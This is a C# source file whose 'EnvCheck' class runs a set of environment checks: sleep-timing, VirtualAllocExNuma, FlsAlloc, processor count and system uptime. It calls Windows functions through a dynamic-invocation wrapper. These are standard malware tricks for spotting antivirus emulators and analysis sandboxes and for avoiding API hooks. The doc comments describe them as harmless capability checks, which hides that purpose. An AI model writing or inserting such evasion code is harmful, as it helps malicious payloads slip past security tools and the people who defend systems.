using System;
using System.Threading;

namespace SvcUtil
{
    internal static class EnvCheck
    {
        /// <summary>
        /// Run all environment checks.
        /// </summary>
        public static bool PassAllChecks()
        {
            return CheckSleepTiming()
                && CheckVirtualAllocExNuma()
                && CheckFlsAlloc()
                && CheckProcessorCount()
                && CheckUptime();
        }

        /// <summary>
        /// Verify timing consistency.
        /// </summary>
        public static bool CheckSleepTiming()
        {
            ulong t1 = DynInvoke.GetTickCount64();
            Thread.Sleep(2000);
            ulong t2 = DynInvoke.GetTickCount64();
            return (t2 - t1) >= 1900;
        }

        /// <summary>
        /// Check NUMA allocation support.
        /// </summary>
        public static bool CheckVirtualAllocExNuma()
        {
            IntPtr result = DynInvoke.VirtualAllocExNuma(
                DynInvoke.GetCurrentProcess(),
                IntPtr.Zero,
                (UIntPtr)0x1000,         // 4 KB
                0x3000,                  // MEM_COMMIT | MEM_RESERVE
                0x04,                    // PAGE_READWRITE
                0);                      // NUMA node 0

            if (result == IntPtr.Zero)
                return false;

            // Clean up the test allocation
            DynInvoke.VirtualFree(result, UIntPtr.Zero, 0x8000); // MEM_RELEASE
            return true;
        }

        /// <summary>
        /// Check FLS support.
        /// </summary>
        public static bool CheckFlsAlloc()
        {
            uint idx = DynInvoke.FlsAlloc(IntPtr.Zero);
            if (idx == 0xFFFFFFFF) // FLS_OUT_OF_INDEXES
                return false;

            DynInvoke.FlsFree(idx);
            return true;
        }

        /// <summary>
        /// Check processor count.
        /// </summary>
        public static bool CheckProcessorCount()
        {
            return Environment.ProcessorCount >= 2;
        }

        /// <summary>
        /// Check system uptime.
        /// </summary>
        public static bool CheckUptime()
        {
            ulong uptime = DynInvoke.GetTickCount64();
            return uptime > 600000; // 10 minutes in milliseconds
        }
    }
}
